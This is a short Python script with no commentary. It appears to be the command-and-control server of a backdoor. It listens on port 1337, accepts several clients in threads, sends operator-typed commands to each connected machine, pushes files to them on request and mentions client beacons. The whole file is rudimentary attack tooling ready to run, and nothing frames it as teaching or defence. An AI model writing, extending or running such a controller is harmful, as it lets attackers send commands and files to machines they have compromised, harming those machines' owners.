import socket
import subprocess
import threading
import time

# Function to handle file transfer
def handle_file_transfer(conn, filename):
    with open(filename, 'rb') as file:
        conn.sendall(file.read())

# Function to handle each client
def client_handler(conn, addr):
    print(f"New connection: {addr}")
    while True:
        command = input('Enter command or "file:<filename>" to send a file: ')
        if command.lower().startswith('file:'):
            filename = command.split(':', 1)[1]
            handle_file_transfer(conn, filename)
        elif command.lower() == 'beacon':
            print("Received beacon from client")
        else:
            conn.sendall(command.encode())
    
    conn.close()
# Function to start the server and accept multiple clients
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('192.168.1.51', 1337))
    server_socket.listen()

    print("Server started. Waiting for connections...")
    while True:
        conn, addr = server_socket.accept()
        client_thread = threading.Thread(target=client_handler, args=(conn, addr))
        client_thread.start()

# Main entry point
if __name__ == "__main__":
    start_server()